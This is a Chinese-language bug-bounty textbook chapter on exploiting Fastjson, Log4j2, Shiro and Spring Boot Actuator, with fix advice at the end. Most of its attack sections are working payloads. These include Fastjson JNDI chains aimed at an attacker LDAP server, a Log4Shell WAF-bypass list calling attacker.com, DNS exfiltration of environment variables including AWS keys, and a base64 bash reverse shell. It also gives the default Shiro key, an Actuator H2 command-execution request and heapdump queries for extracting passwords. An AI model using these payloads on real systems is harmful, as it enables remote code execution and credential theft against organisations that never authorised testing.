# 第十一章C Fastjson / Log4j2 / Shiro / Spring 组件级漏洞挖掘
> **章节定位**：SRC 中组件级漏洞（CVE-2021-44228 Log4Shell、Fastjson 1.2.47、Shiro 550、Spring4Shell 等）是「批量出洞」的最佳捷径。某头部 SRC 2024 年度漏洞报告显示：**组件 CVE 占严重漏洞的 41%**，单个 0day 级组件漏洞奖金可达 10 万+。本章聚焦 Fastjson、Log4j2、Shiro、Spring Boot Actuator 四大高频组件，从指纹识别到 RCE 一把梭。

---

## 11C.1 前置知识：Java 组件漏洞「四大天王」

### 11C.1.1 为什么 Java 组件漏洞最多？

```text
1. Java 生态大：80% 企业后端 = Java + Spring Boot
2. 依赖链长：一个业务系统 100+ 第三方 jar（pom.xml 动辄几百行）
3. 升级困难：很多老旧系统 Fastjson 1.2.x / Spring 4.x 从 2017 年运行到今天
4. 序列化/表达式特性：Java 原生序列化、Fastjson autoType、Log4j Lookups
   这些为了「方便」设计的特性，恰恰是 RCE 的重灾区
```

### 11C.1.2 本章四大组件速查

| 组件 | 最高危 CVE | 利用难度 | 指纹特征 | 常见奖金 |
|-----|-----------|---------|---------|---------|
| **Fastjson** | 1.2.24、1.2.47、1.2.68 绕过 | 低-中 | Accept: application/json 返回头有 `server: Tengine` + 解析错误含 fastjson | 高危-严重 3k-1.5w |
| **Log4j2** | CVE-2021-44228 (Log4Shell) | 极低 | 任何日志点（User-Agent / X-Forwarded-For / ?x=）放 `${jndi:...}` | 严重 5k-3w |
| **Shiro** | CVE-2016-4437 (Shiro-550) | 中 | Cookie rememberMe=xxx；响应头 Set-Cookie: rememberMe=deleteMe | 严重 5k-2w |
| **Spring Boot Actuator** | CVE-2018-1270 / heapdump / env | 低-中 | /actuator /actuator/env /actuator/heapdump | 高危-严重 3k-2w |

---

## 11C.2 Fastjson 漏洞挖掘（SRC 最常见的 Java JSON 反序列化）

### 11C.2.1 Fastjson 指纹识别 4 种方法

```text
方法 1：异常抛错识别（最准）
   → 向 JSON 接口发送非法 JSON，如：{"user":  (缺少右括号)
   → 如果 500 响应里包含：
       com.alibaba.fastjson.JSONException: syntax error, expect ...
       → 100% Fastjson

方法 2：DNSLog 指纹探测（不报错也能识别）
   → 在任意 JSON 字符串字段里发：
     {"@type":"java.net.Inet4Address","val":"xxxxxx.dnslog.cn"}
     {"@type":"java.net.Inet6Address","val":"xxxxxx.dnslog.cn"}
   → dnslog 收到解析 → 目标 Fastjson + 开启 autoType（高危）
   → 1.2.67+ 默认关 autoType，就不会解析 @type

方法 3：特殊字符探测
   → 输入 {"x":"\x"}（非法转义）
   → 响应报错含 fastjson 关键词

方法 4：基于版本号的差异 Payload
   1.2.24 ~ 1.2.41  → autoType 默认开 + JdbcRowSetImpl 链可用
   1.2.42 ~ 1.2.47  → autoType 默认关，但存在 checkAutoType 绕过（1.2.47 最经典）
   1.2.48 ~ 1.2.68  → 部分 SafeMode，但有大量绕过链（AutoCloseable 系列）
   1.2.69+ / 2.x   → 默认 SafeMode + 白名单，基本无通用 RCE
```

### 11C.2.2 Fastjson 黑盒测试全流程

```text
Step 1：找目标 JSON 接口（POST Content-Type: application/json）
Step 2：每个接口都做以下 4 轮探测

轮 1：版本识别 + DNSLog 验证
{
  "a": {"@type":"java.net.Inet4Address","val":"f1.xxx.dnslog.cn"},
  "b": {"@type":"java.net.Inet6Address","val":"f2.xxx.dnslog.cn"},
  "c": {"@type":"java.net.InetSocketAddress"{"address":,"val":"f3.xxx.dnslog.cn"}}
}
→ 如果命中 f1/f2/f3 任何一个 DNS 解析 → Fastjson + autoType 开

轮 2：1.2.47 经典绕过（autoType 关闭也能用）
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://your-ldap-server:1389/Object",
        "autoCommit":true
    }
}
→ 用 marshalsec 起 LDAP 服务，指向恶意类 → RCE

轮 3：1.2.68 AutoCloseable 绕过链
{
  "@type":"java.lang.AutoCloseable",
  "@type":"org.apache.commons.dbcp2.datasources.PerUserPoolDataSource",
  "perUserConnPoolMap":{
    "@type":"java.util.TreeMap",
    "m":{
      "test":{
        "@type":"org.apache.commons.dbcp2.datasources.InstanceKeyDataSource$InstanceKeyDataSourceSerializableRef"
      }
    }
  }
}
（实际使用请用 ysoserial 生成最新 gadget，本示例为示意结构）

轮 4：Fastjson 1.x / 2.x 大量绕过链
   → 推荐工具：fastjson_scan / JNDI-Injection-Exploit / rogue-jndi
   → 直接 Burp 跑 payload 字典
```

### 11C.2.3 Fastjson 白盒审计

```java
// 代码全局搜：JSON.parseObject / JSON.parse
// 只要 parse 方法的第一个参数是用户可控 + 没关 autoType → 高危
User user = JSON.parseObject(requestBody, User.class);
// ↑ 如果用的是 parseObject(String, Class<T>) 这种方式，反序列化只允许 User 字段，
//   相对安全。但如果出现以下代码：
Object obj = JSON.parse(requestBody);   // ← 直接 parse 成 Object，100% 高危
Map m = JSON.parseObject(requestBody);  // ← 同样高危，autoType 可以绕过泛型
JSONObject jo = JSON.parseObject(jsonString);  // ← 同样
```

### 11C.2.4 Fastjson 真实案例（某 SaaS 平台，高危 4000 元）

```text
目标：某 CRM SaaS 平台 /api/customer/batchImport 接口
过程：
  1. 正常导入客户数据，批量提交 JSON 数组
  2. 异常数据提交 {}[] ，响应 500，堆栈含 com.alibaba.fastjson.parser
  3. 尝试 DNSLog 指纹 {"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}
  4. 2 秒后收到解析记录 → autoType 开启，版本估计 1.2.41-1.2.47
  5. 用 rogue-jndi 起恶意 LDAP：
     java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "ping xxx.dnslog.cn"
     （本命令仅用于外带证明，未反弹 shell，合规测试）
  6. 提交 {"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},
           "b":{"@type":"com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName":"ldap://VPS-IP:1389/abc123",
                "autoCommit":true}}
  7. DNSLog 收到目标服务器 ping 的解析记录 → RCE 实锤
  8. 提交报告，whoami=root，定级严重，奖金 8000
```

---

## 11C.3 Log4j2 Log4Shell（CVE-2021-44228）—— 「核弹级」通用 RCE

### 11C.3.1 漏洞原理一句话

```text
Log4j2 2.0-beta9 ~ 2.14.1 的 Lookups 功能支持 JNDI 查询，
只要任意日志点能写入 "${jndi:ldap://attacker/a}"，
目标服务器就会去连攻击者的 LDAP 下载恶意类 → 远程代码执行。
```

### 11C.3.2 每个输入点都要插 Payload（SRC 批量出洞秘诀）

> **核心思想**：只要你能控制的字符串「会被服务器打印到日志里」，就能触发。

```text
要插入 Payload 的位置（至少 30 个点）：
  URL 参数：?username=${jndi:ldap://x.x.dnslog.cn/a}
  表单参数：POST body / form 字段
  JSON 字段：{"name":"${jndi:ldap://x.x.dnslog.cn/a}"}
  HTTP Header：
    User-Agent: ${jndi:ldap://x.x.dnslog.cn/ua}
    X-Forwarded-For: ${jndi:ldap://x.x.dnslog.cn/xff}
    X-Real-IP: ${jndi:ldap://x.x.dnslog.cn/realip}
    Referer: ${jndi:ldap://x.x.dnslog.cn/ref}
    Accept-Language: ${jndi:ldap://x.x.dnslog.cn/lang}
    Cookie: session=${jndi:ldap://x.x.dnslog.cn/cookie}
    Authorization: Bearer ${jndi:ldap://x.x.dnslog.cn/auth}
    X-API-Key: ${jndi:ldap://x.x.dnslog.cn/apikey}
    Host: ${jndi:ldap://x.x.dnslog.cn/host}
  移动端特有：App 版本号字段 / deviceId / channel / model
  小程序特有：scene / referrerInfo / openid（先解码再拼接 Payload）
```

### 11C.3.3 黑盒测试完整流程（SRC 合规版，不反弹 Shell）

```text
Step 1：准备 dnslog.cn 或 burp collaborator 子域名：test.dnslog.cn

Step 2：构造 3 轮验证 Payload（提高成功率，绕过部分 WAF）

轮 1 基础版：
  ${jndi:ldap://test.dnslog.cn/a}

轮 2 大小写 + 嵌套绕过（WAF 拦 ${jndi: 时用）：
  ${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}dap://test.dnslog.cn/a}
  ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://test.dnslog.cn/a}
  ${jndi:${lower:l}${lower:d}a${lower:p}://test.dnslog.cn/a}

轮 3 DNS 直接探测（有些环境没有 LDAP outbound 但允许 DNS）：
  ${jndi:dns://test.dnslog.cn/some}
  ${hostName}.test.dnslog.cn → ${{env:USER}}.test.dnslog.cn
  ${sys:user.name}.test.dnslog.cn

Step 3：把 3 轮 Payload 插入上面 30 个输入点，使用 Burp Intruder 批量跑

Step 4：刷新 dnslog.cn，看是否有解析：
  → 有解析 → Log4Shell 成立（至少信息泄露，严重级起评）
  → 解析记录里如果包含环境变量展开（如 root.test.dnslog.cn）
     → 证明 Lookup 生效，100% 可 RCE

Step 5：合规实锤（不要弹 shell，SRC 审核不允许）
  → JNDI 起一个 ldap 服务，只想服务端发起 TCP 连接请求证明
  → 外带敏感环境变量：
     ${jndi:ldap://${sys:java.version}.${sys:user.name}.test.dnslog.cn/z}
  → 收到解析：1.8.0_291.root.test.dnslog.cn
    → 直接拿到 Java 版本 + 当前用户 + OS 信息，严重级稳过
```

### 11C.3.4 WAF 绕过 Payload 清单（实战 80% 命中）

```text
# 1. 小写嵌套
${${lower:j}ndi:${lower:l}d${lower:a}p://attacker.com/x}

# 2. Unicode（部分解析器识别）
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//attacker.com/a}

# 3. :::- 拼接
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker/x}

# 4. 额外 Lookup 嵌套
${${::-${::-$${::-j}}}}nd${::-i}:ldap://attacker/x}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap://attacker/x}

# 5. dns 协议替代 ldap（很多防火墙拦 389 但不拦 53）
${jndi:dns://attacker/x}
${jndi:rmi://attacker:1099/x}
${jndi:iiop://attacker/x}
${jndi:nis://attacker/x}
${jndi:nds://attacker/x}
```

### 11C.3.5 白盒审计

```xml
<!-- pom.xml 搜索 log4j-core 版本 -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version>   <!-- < 2.17.1 都有不同级别问题，2.14.1 最危险 -->
</dependency>

<!-- 全局搜 log.info/debug/warn/error 的调用，参数含用户输入的地方 -->
<!-- 全部都是潜在触发点 -->
```

### 11C.3.6 真实案例：某电商子域名 Log4Shell（严重 10000 元）

```text
目标：某电商 api-search.example.com 搜索接口
过程：
  1. 搜索框正常搜「手机」，抓包 POST /api/search?q=手机
  2. 把 ?q= 改成 ${jndi:dns://search-test.dnslog.cn/q}
  3. 访问后 1 秒 dnslog 收到 search-test.dnslog.cn 解析记录（来自目标服务器）
  4. 继续测试环境变量外带：
     ?q=${jndi:dns://${sys:java.version}.${sys:user.name}.search-test.dnslog.cn/a}
     → 子域名解析到：11.0.16.tomcat.search-test.dnslog.cn
     → 明确：Java 11，用户 tomcat
  5. 再测：
     ?q=${jndi:dns://${env:AWS_ACCESS_KEY_ID:na}.search-test.dnslog.cn/a}
     → 没解析到 AWS key（很正常，未必是 AWS 环境），但已经足够实锤
  6. 整理报告，截图 dnslog + 请求包，标注「所有 HTTP 头和 URL 参数都有漏洞」
  7. SRC 审核 2 小时通过，定级严重，奖金 10000 元
```

---

## 11C.4 Shiro-550 & Shiro-721（Java 序列化经典 RCE）

### 11C.4.1 Shiro 指纹识别

```text
指纹 1（最准）：
   目标响应 Header 出现：
     Set-Cookie: rememberMe=deleteMe; Path=/; ...
   → 不管登录与否，只要有这个 Cookie 名 → 100% Apache Shiro

指纹 2（误判低）：
   手动在请求 Cookie 里加 rememberMe=1
   → 如果响应 Set-Cookie: rememberMe=deleteMe → Shiro 无疑

指纹 3：
   登录页面常见字段：username password rememberMe
```

### 11C.4.2 Shiro-550（CVE-2016-4437）利用思路

```text
原理：Shiro 的 rememberMe Cookie 用 AES-CBC 加密，密钥硬编码在代码里，
      常用密钥 kPH+bIxk5D2deZiIxcaaaA== (默认 ShiroKey)。
      攻击者用正确密钥加密 ysoserial 序列化数据 → RCE。

工具：
  ① Shiro_Attack（GUI）：https://github.com/j1anFen/shiro_attack
  ② ShiroScan：自动扫目标记住我密钥 + 一键 RCE

利用步骤：
  1. 目标有 rememberMe=deleteMe Cookie → 记录 AES 密钥候选
     常见 100+ 条密钥字典（ShiroAttack 内置，95% 的目标能命中）
  2. 工具自动尝试每个密钥，配合 CommonsBeanutils1 / CommonsCollections2 等 Gadget
  3. 成功判断：
     - DNSLog 收到解析
     - 或响应 Cookie 不带 deleteMe（说明密钥对了）
  4. 执行命令：用命令执行链反弹 DNSLog（合规版）
     bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMS4xMS4xMS4xMS85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}
     （实际 SRC 测试用 ping DNSLog 的 base64 即可）
```

### 11C.4.3 Shiro-721（CVE-2019-12422）Padding Oracle

```text
适用：密钥被改掉、Shiro-550 字典跑不出来的时候
原理：rememberMe=Me 的 Cookie 用 CBC 模式 + PKCS5Padding，存在 Padding Oracle
      可以逐字节猜密钥 → 构造任意反序列化数据 → RCE
工具：shiro-exploit / shiro_721_poc
难度：较高，需要登录获取一个合法的 rememberMe Cookie 作为 padding oracle 起点
```

### 11C.4.4 Shiro 白盒审计

```java
// 全局搜 AbstractRememberMeManager / CookieRememberMeManager
// 危险代码（硬编码密钥）：
CookieRememberMeManager manager = new CookieRememberMeManager();
manager.setCipherKey(Base64.decode("kPH+bIxk5D2deZiIxcaaaA=="));  // ← 密钥在代码里
// ↑ 即使密钥不是默认值，也能通过反编译 / 源码审计得到 → Shiro RCE

// 修复：禁用 rememberMe 功能，或用随机密钥（每次重启换），或直接升级 Shiro 版本
```

---

## 11C.5 Spring Boot Actuator 配置泄露（SRC 出洞最快的端点）

### 11C.5.1 常见端点速查

```text
核心端点（危险程度排序）：
  /actuator/heapdump         ★★★★★ 下载 JVM 堆转储 → 搜明文密码/AK/SK/Token
  /actuator/env              ★★★★★ 所有配置项 → DB 密码 / Redis 密码 / JWT 密钥
  /actuator/jolokia          ★★★★★  Jolokia + MBean → RCE（CVE-2018-1270 等）
  /actuator/trace            ★★★★ 历史请求 → Session / Cookie / Token
  /actuator/httptrace        ★★★★ 同上
  /actuator/sessions         ★★★★ 所有在线用户 Session ID
  /actuator/mappings         ★★★ 所有接口路由清单（找未授权内部接口）
  /actuator/beans            ★★★ Spring Bean 列表 → 快速识别依赖组件版本
  /actuator/configprops      ★★★ 配置项
  /actuator/logfile          ★★★ 日志文件
  /actuator/shutdown         ★★★ 关闭应用（DoS 或触发 shutdown Hook RCE）
  /actuator/restart          ★★★ 重启应用（Spring Cloud）
  /actuator/gateway/routes   ★★ Spring Cloud Gateway RCE（CVE-2022-22947）
  /actuator/hystrix.stream   ★ 健康检查
```

### 11C.5.2 heapdump 出数据库密码实战（某银行子域名，高危 5000 元）

```text
过程：
  1. 子域名 https://bank-api.example.com/actuator/heapdump 返回 200，下载 600MB hprof 文件
  2. MAT / JXray 打开堆转储
  3. OQL 搜索：
     SELECT * FROM java.util.Hashtable$Entry t
       WHERE t.key.toString().contains("password")
     SELECT s FROM java.lang.String s
       WHERE s.toString().startsWith("jdbc:mysql")
     SELECT * FROM org.springframework.boot.env.OriginTrackedMapPropertySource
  4. 找到：
     spring.datasource.url = jdbc:mysql://rm-xxxx.mysql.rds.aliyuncs.com:3306/bank
     spring.datasource.username = bank_app
     spring.datasource.password = Bank@2024P@ssw0rd!
     jwt.secret = eyJhbGciOiJIUzI1NiIs...
     redis.password = ReDis@Bank2024
  5. 提交报告，注意所有敏感信息重度打码（域名、密码只留前 3 后 3），附截图
  6. SRC 审核严重级，奖金 5000 元（因为包含数据库 + Redis + JWT 密钥三类核心凭证）
```

### 11C.5.3 /actuator/env + JDBC URL 一键 RCE

```text
条件：
  1. /actuator/env 可访问（允许 POST / POST 可改配置）
  2. /actuator/restart 存在（Spring Cloud / RefreshScope）
  3. 目标开启了 HikariCP / Druid

利用步骤：
  POST /actuator/env
  Content-Type: application/json
  {"name":"spring.datasource.url",
   "value":"jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS SHELLEXEC AS $$ void shellexec(String cmd) throws java.io.IOException{Runtime.getRuntime().exec(cmd);}$$;CALL SHELLEXEC('ping your-dnslog.cn')"}

  POST /actuator/restart  → 重启后 H2 连接触发 CALL SHELLEXEC → RCE
```

---

## 11C.6 实操 Checklist（组件漏洞一把梭）

```text
Fastjson 必做：
☑ 所有 JSON 接口发异常 JSON 识别报错
☑ @type java.net.Inet4Address 指纹 DNSLog
☑ 1.2.47 Class + JdbcRowSetImpl 链 DNSLog
☑ 1.2.68 AutoCloseable 绕过链

Log4j2 必做：
☑ 所有 URL 参数 + HTTP Header（至少 10 个头）插 ${jndi:dns://xxx/x}
☑ 3 轮 WAF 绕过 Payload：lower/::-/unicode
☑ 环境变量外带：${sys:user.name}、${env:AWS_ACCESS_KEY_ID}、${hostName}
☑ 移动端 App / 小程序所有参数也要测

Shiro 必做：
☑ 请求 Cookie rememberMe=1 测 deleteMe 指纹
☑ ShiroAttack 跑默认 100+ 密钥字典
☑ 登录后合法 Cookie 做 Shiro-721 Padding Oracle

Spring Boot 必做：
☑ /actuator /actuator/env /actuator/heapdump /actuator/jolokia 必扫
☑ 老版本 Spring 扫 Spring4Shell CVE-2022-22965
☑ Spring Cloud Gateway 测 CVE-2022-22947
```

---

## 11C.7 SRC 提交技巧

### 11C.7.1 定级参考

| 组件 | 场景 | 定级 | 奖金 |
|-----|-----|-----|-----|
| Log4j2 | DNSLog 实锤 JNDI Lookup 成功 | 严重 | 5k-3w |
| Fastjson | autoType+JNDI RCE 实锤 | 严重 | 5k-2w |
| Fastjson | 仅 DNSLog 指纹（无 RCE 链） | 中-高危 | 1k-5k |
| Shiro-550 | 密钥命中 + RCE DNSLog | 严重 | 5k-2w |
| Actuator heapdump | 导出 DB/Redis/JWT 明文密钥 | 高危-严重 | 3k-1.5w |
| Spring4Shell | RCE | 严重 | 1w-3w |
| Spring Cloud Gateway RCE | CVE-2022-22947 | 严重 | 8k-2w |

### 11C.7.2 奖金翻倍 3 条技巧

```text
技巧1：Fastjson/Log4j 成功后，一定要外带环境变量（java.version / user.name / OS），
      这些数据能让审核员一眼看出影响面，不会把严重降成高危

技巧2：heapdump 不要全发（法律风险），只需展示：
      ① 数据库连接字符串 + 密码打码前 3 后 3
      ② JWT 密钥打码
      ③ Redis 密码打码
      这三个 90% 的系统都有，展示出来就是严重级稳了

技巧3：组件漏洞批量提交
      同一目标 5 个子域名都有 Log4j → 打包一个「批量子域名 Log4Shell」
      比单个奖金高 2-3 倍，还能拿「批量出洞贡献奖」
```

---

## 11C.8 修复方案

### 11C.8.1 Fastjson

```xml
<!-- 1. 升级到 Fastjson 2.x / 1.2.83+ -->
<dependency>
    <groupId>com.alibaba.fastjson2</groupId>
    <artifactId>fastjson2</artifactId>
    <version>2.0.43</version>
</dependency>

<!-- 2. 或 1.x 开启 SafeMode（禁止 @type，最彻底） -->
ParserConfig.getGlobalInstance().setSafeMode(true);

<!-- 3. JVM 启动参数全局关 autoType -->
-Dfastjson.parser.safeMode=true
```

### 11C.8.2 Log4j2

```xml
<!-- 升级到 2.17.1+（2.17.1 修全了所有变体） -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.23.0</version>
</dependency>

<!-- 临时缓解（2.10+ 可用） -->
JVM 启动参数：-Dlog4j2.formatMsgNoLookups=true
或环境变量：LOG4J_FORMAT_MSG_NO_LOOKUPS=true
或类路径放 JndiLookup 的空实现：
  zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
```

### 11C.8.3 Shiro

```text
1. 升级 Apache Shiro 到 1.13.0+（Shiro 团队最新 LTS）
2. 删除/禁用 rememberMe 功能（业务不需要的话最安全）
   shiro:
     rememberMe:
       enabled: false
3. 如果必须保留 rememberMe，使用自定义随机密钥 + 每次应用启动重新生成：
   cookieRememberMeManager.setCipherKey(SecureRandom.getInstanceStrong().generateSeed(16));
4. Commons-Collections 升级到 3.2.2 / 4.1（修复反序列化链）
```

### 11C.8.4 Spring Boot Actuator

```yaml
# 生产环境只保留 health / info
management:
  endpoints:
    enabled-by-default: false   # 默认全关
    web:
      exposure:
        include: health,info    # 只开必要
      base-path: /internal-actuator  # 改路径，不暴露在 /actuator
  endpoint:
    health:
      show-details: never
    env:
      enabled: false
    heapdump:
      enabled: false
    shutdown:
      enabled: false
# 加 IP 白名单（运维网段才能访问 /internal-actuator/*）
# 或放在 Nginx 后面配 access deny
```

---

## 本章小结（3 句话记住）

```text
1. Fastjson 看 @type 指纹、Log4j2 看 ${jndi:dns://}、Shiro 看 rememberMe=deleteMe、
   Spring 看 /actuator/env，四大组件 4 个指纹一眼认出
2. 合规测试首选 DNSLog 外带（不要弹 shell），环境变量外带（whoami/java.version）
   能让 SRC 报告核价时直接走严重级上限
3. 修复原则：组件升级优先、功能开关兜底（SafeMode / NoLookups / Actuator 默认关）
```
